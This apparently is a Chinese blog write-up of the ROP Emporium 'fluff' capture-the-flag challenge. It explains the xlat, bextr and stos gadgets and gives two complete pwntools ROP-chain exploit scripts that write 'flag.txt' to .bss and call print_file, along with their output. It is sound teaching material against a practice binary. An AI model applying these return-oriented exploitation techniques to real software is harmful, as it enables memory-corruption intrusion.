---
title: fluff
published: 2026-05-23
image: ""
tags: [pwn]
category: pwn
draft: false
series: ROP Emporium
---

# 题目描述

跟前面一样，这道题同样是需要在可写段写入目标字符串`”flag.txt“`，并作为参数调用目标函数，这个过程中同样需要找到有用的gadgets，并控制相应寄存器来完成，总体看来思路很简单——但或许没有那么简单，毕竟能放在第六题。来看看怎么个事

# 解题过程

## 工具

`pwntools`、`ropper`、`gdb`

## 查反汇编，找目标函数、gadgets

直接查

```terminal
objdump -d -M ./fluff
```

这道题贴心提示了**一些有用的 gadget 可以在`questionableGadgets`找到**，那我们就格外留意一下

```terminal
0000000000400510 <print_file@plt>

0000000000400628 <questionableGadgets>:
  400628:       d7                      xlat   BYTE PTR ds:[rbx]
  400629:       c3                      ret
  40062a:       5a                      pop    rdx
  40062b:       59                      pop    rcx
  40062c:       48 81 c1 f2 3e 00 00    add    rcx,0x3ef2
  400633:       c4 e2 e8 f7 d9          bextr  rbx,rcx,rdx
  400638:       c3                      ret
  400639:       aa                      stos   BYTE PTR es:[rdi],al
  40063a:       c3                      ret
  40063b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
```

不少没见过面的指令呢，而在多个寄存器的联动下，如果不知道指令的意思的话，用起来便会相当困难——这便是难点之一

针对于对我们有用的指令作一下解释：

```terminal
xlat   BYTE PTR ds:[rbx]   xlat 可以近似理解为al = [rbx + al]。执行前，al参与地址计算，作为偏移的一部分；执行后，al被改成该地址处的1字节内容

bextr  rbx,rcx,rdx   其一般含义是根据rdx指定的起始bit和长度，从rcx中提取一段bit放入 rbx

stos   BYTE PTR es:[rdi],al   它会把AL写入[RDI]，在方向标志 DF=0的常见情况下，RDI会自动加1
```

**特别提醒！这里要注意在bextr之前会对rcx进行一个add操作，所以不能直接让rcx等于我们的目标值，而是要减去对应add值，也就是`0x3ef2`**

还有一个有趣的点是，如果我们给`rdx`的值是`0x4000`的话，`低8位`值为`0`，`高8位`值为`64`

这就意味着从`rcx`的`0位`开始取，一共取`64位`(即`8字节`，`rbx`和`rcx`都是`8字节`)，**届时，bextr  rbx,rcx,rdx指令的意思就变成了把rcx的值直接给到了rbx**，一下就明朗了

了解到指令的具体作用后，我们的脑子里也应该先对写入的整个流程有一个大致认知：

> `bextr`用来间接控制`rbx`，使得`rbx + 当前al = 目标字符地址`

> 随后`xlat`会执行`al = [rbx + al]`，把该地址处的字符读入`al`

> 最后`stos BYTE PTR es:[rdi],al`将其写入`rdi`指向的地址(`可写段`)

于是我们还需要找的便是：

`可写段地址`、`目标字符地址`、`al初始内容`、`pop rdi的gadget`

那我们开始吧，先是`可写段地址`：

```terminal
readelf -S -W intel ./fluff
```

找到：

```terminal
Section Headers:
[Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al #依旧附上表头
[24] .bss              NOBITS          0000000000601038 001038 000008 00  WA  0   0  1
```

和前面题一样，这里 `.bss` 大小显示为8，而`"flag.txt"`正好8字节。本题中可以正常读取；如果后续遇到字符串读取异常，需要额外关注结尾`\x00`的问题

再就是`目标字符地址`

```terminal
ropper --file ./fluff --string "f"
ropper --file ./fluff --string "l"
ropper --file ./fluff --string "a"
ropper --file ./fluff --string "g"
ropper --file ./fluff --string "."
ropper --file ./fluff --string "t"
ropper --file ./fluff --string "x"
```

找到(不唯一):

```terminal
Strings
=======

Address     Value  
-------     -----
0x004003c4  f
0x004003c5  l
0x004003d6  a
0x004003cf  g
0x004003c9  .
0x004003d5  t
0x00400246  x
```

然后是`al初始内容`，用`gdb`

```terminal
gdb ./fluff

fluff by ROP Emporium
x86_64

You know changing these strings means I have to rewrite my solutions...
> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

依旧使劲输入a，通过`gdb`看到：

```terminal
RAX  0xb
```

因此初始`al = 0x0b`

最后是`gadget`，用`ropper`

```terminal
ropper --file ./fluff --search "pop rdi"

0x00000000004006a3: pop rdi; ret;
```

找齐了，接下来便是写脚本

## 构造exp脚本

从我们前面的大致写入思路来看，我们无非要注意这几点：

1. `rcx`会先加`0x3ef2`，再给到`rbx`
2. `al`会等于`rbx+al`地址指向的内容，我们需要让这个内容等于我们需要的字符所在地址，**注意，此时al内容已经改变，在进行下一次写入时得留意**
3. **`rdi`在写入后通常自动往下移一个字节**，除了第一次，后续就不用单独`pop rdi`了

```
wanted_rbx = rcx + 0x3ef2

old_al + wanted_rbx = char_addr

al = [old_al + wanted_rbx]

于是我们就可以专注控制rcx来达成目的

rcx = char_addr - old_al -0x3ef2
```

思路明确后，最终脚本大致就长这样：

```python
from pwn import *

p = process('./fluff')
p.recv() 

payload = b'A' * 40 + p64(0x40062a) + p64(0x4000) + p64(0x3fc4c7) + p64(0x400628) + p64(0x00000000004006a3) + p64(0x0000000000601038) + p64(0x400639)
#先是40字节offset，然后是pop rdx和rcx，后面对应放上rdx、rcx，再读入al，接着pop rdi;ret，放上.bss地址，最后是写入操作                                        
#后面如法炮制，但考虑到rdi在写入后通常自动往下移一个字节，后续就不用单独pop rdi了
payload += p64(0x40062a) + p64(0x4000) + p64(0x3fc46d) + p64(0x400628) + p64(0x400639)
payload += p64(0x40062a) + p64(0x4000) + p64(0x3fc478) + p64(0x400628) + p64(0x400639)
payload += p64(0x40062a) + p64(0x4000) + p64(0x3fc47c) + p64(0x400628) + p64(0x400639)
payload += p64(0x40062a) + p64(0x4000) + p64(0x3fc470) + p64(0x400628) + p64(0x400639)
payload += p64(0x40062a) + p64(0x4000) + p64(0x3fc4b5) + p64(0x400628) + p64(0x400639)
payload += p64(0x40062a) + p64(0x4000) + p64(0x3fc2e0) + p64(0x400628) + p64(0x400639)
payload += p64(0x40062a) + p64(0x4000) + p64(0x3fc46b) + p64(0x400628) + p64(0x400639)
payload += p64(0x00000000004006a3) + p64(0x0000000000601038) + p64(0x0000000000400510)

p.sendline(payload)
p.interactive()
```

更直观的版本(AIGC)：

```python
from pwn import *

p = process('./fluff')
p.recv()

offset = 40
bss = 0x601038

xlat_ret = 0x400628
pop_rdx_rcx_bextr_ret = 0x40062a
stosb_ret = 0x400639
pop_rdi_ret = 0x4006a3
print_file_plt = 0x400510

payload = b'A' * offset

# 写 'f'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc4c7)
payload += p64(xlat_ret)
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(stosb_ret)

# 写 'l'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc46d)
payload += p64(xlat_ret)
payload += p64(stosb_ret)

# 写 'a'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc478)
payload += p64(xlat_ret)
payload += p64(stosb_ret)

# 写 'g'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc47c)
payload += p64(xlat_ret)
payload += p64(stosb_ret)

# 写 '.'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc470)
payload += p64(xlat_ret)
payload += p64(stosb_ret)

# 写 't'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc4b5)
payload += p64(xlat_ret)
payload += p64(stosb_ret)

# 写 'x'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc2e0)
payload += p64(xlat_ret)
payload += p64(stosb_ret)

# 写 't'
payload += p64(pop_rdx_rcx_bextr_ret)
payload += p64(0x4000)
payload += p64(0x3fc46b)
payload += p64(xlat_ret)
payload += p64(stosb_ret)

# print_file("flag.txt")
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(print_file_plt)

p.sendline(payload)
p.interactive()
```

跑一下

```python
python3 fluff.py

[+] Starting local process './fluff': pid 24183
[*] Switching to interactive mode
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```

收工

# 总结

学到了不少新东西

+ 首先是`al`是`rax`的`低一字节`

+ 再然后是对那三个没见过的指令(`xlat、bextr、stos`)有了不错的理解

+ 最后，根据思路和目标程序流进行rop链架构构造也更加熟练了

相当有意思的题目
